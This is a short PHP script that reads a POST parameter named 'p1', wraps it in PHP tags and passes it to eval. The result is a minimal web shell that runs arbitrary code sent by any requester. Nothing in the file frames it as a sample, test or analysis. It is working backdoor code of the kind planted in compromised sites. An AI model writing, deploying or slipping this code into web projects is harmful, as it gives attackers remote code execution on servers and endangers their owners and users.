<?php
$p1 = $_POST['p1'];
$phpcode = trim($p1);
$phpcode = "<?php\n\n{$phpcode}\n\n?>";
eval("?".">$phpcode<?");
?>